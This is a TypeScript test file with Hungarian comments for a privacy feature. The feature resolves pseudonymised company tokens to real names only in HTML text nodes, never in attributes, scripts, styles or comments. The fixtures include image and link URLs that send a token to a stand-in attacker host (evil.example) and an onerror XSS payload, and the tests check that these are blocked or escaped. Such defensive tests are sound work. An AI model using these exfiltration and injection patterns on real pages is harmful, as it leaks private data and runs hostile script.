/**
 * HTML megjelenítési feloldás (mini-app / workspace): szöveg-node igen,
 * attribútum / script / style nem (APG-07 §10.3).
 *
 * Futtatás: npm run test:html-surrogate-resolve
 */
import assert from 'node:assert/strict'
import { resolvableHtmlTextRanges } from '../src/domain/privacy/html-surrogate-context'
import { resolveHtmlDisplayText } from '../src/domain/privacy/resolve-display-text'

let failures = 0
async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn()
    console.log(`  ✓ ${name}`)
  } catch (err) {
    failures += 1
    console.error(`  ✗ ${name}: ${err instanceof Error ? err.message : String(err)}`)
  }
}

const SUR = '[[COMPANY@S15_1]]'
const lookup = async (surrogate: string) => (surrogate === SUR ? 'SPAR' : null)

async function main() {
  console.log('HTML álnév-feloldás (szöveg-node only)\n')

  await test('szöveg-node feloldódik', async () => {
    const out = await resolveHtmlDisplayText(`<h1>Rendelési riport — ${SUR}</h1>`, lookup)
    assert.equal(out, '<h1>Rendelési riport — SPAR</h1>')
  })

  await test('több szöveg-node + forrásbélyeges token', async () => {
    const src = `<div><strong>${SUR} nettó érték</strong><span>${SUR} rendelések</span></div>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(
      out,
      '<div><strong>SPAR nettó érték</strong><span>SPAR rendelések</span></div>',
    )
  })

  await test('HTML attribútumban az álnév feloldatlan marad', async () => {
    const src = `<img src="https://evil.example/?c=${SUR}" alt="x">`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out.includes('SPAR'), false)
    assert.equal(out.includes(SUR), true)
  })

  await test('href attribútumban feloldatlan, link szöveg feloldódik', async () => {
    const src = `<a href="https://evil.example/?c=${SUR}">cég: ${SUR}</a>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out, `<a href="https://evil.example/?c=${SUR}">cég: SPAR</a>`)
  })

  await test('script tartalma feloldatlan', async () => {
    const src = `<script>const x = "${SUR}"</script><p>${SUR}</p>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out, `<script>const x = "${SUR}"</script><p>SPAR</p>`)
  })

  await test('style tartalma feloldatlan', async () => {
    const src = `<style>.x::before{content:"${SUR}"}</style><p>${SUR}</p>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out.includes(`content:"${SUR}"`), true)
    assert.equal(out.endsWith('<p>SPAR</p>'), true)
  })

  await test('kommentben feloldatlan', async () => {
    const src = `<!-- ${SUR} --><p>${SUR}</p>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out, `<!-- ${SUR} --><p>SPAR</p>`)
  })

  await test('idézőjeles attribútum nem zavarja a szöveg-node határt', async () => {
    const src = `<div title='say > ${SUR}' data-x="a>b">${SUR}</div>`
    const out = await resolveHtmlDisplayText(src, lookup)
    assert.equal(out, `<div title='say > ${SUR}' data-x="a>b">SPAR</div>`)
  })

  await test('vault megjelenítési érték HTML-escapelve kerül a szöveg-node-ba (XSS)', async () => {
    const evil = `Evil</h1><img src=x onerror="alert(1)"> & Co`
    const evilLookup = async (surrogate: string) => (surrogate === SUR ? evil : null)
    const out = await resolveHtmlDisplayText(`<h1>Riport — ${SUR}</h1>`, evilLookup)
    assert.equal(
      out,
      '<h1>Riport — Evil&lt;/h1&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt; &amp; Co</h1>',
    )
    assert.equal(out.includes('</h1><img'), false)
    assert.equal(out.includes('onerror="alert'), false)
  })

  await test('resolvableHtmlTextRanges: üres HTML', () => {
    assert.deepEqual(resolvableHtmlTextRanges(''), [])
  })

  console.log(failures === 0 ? '\nMinden teszt zöld.' : `\n${failures} hiba.`)
  process.exit(failures === 0 ? 0 : 1)
}

void main()
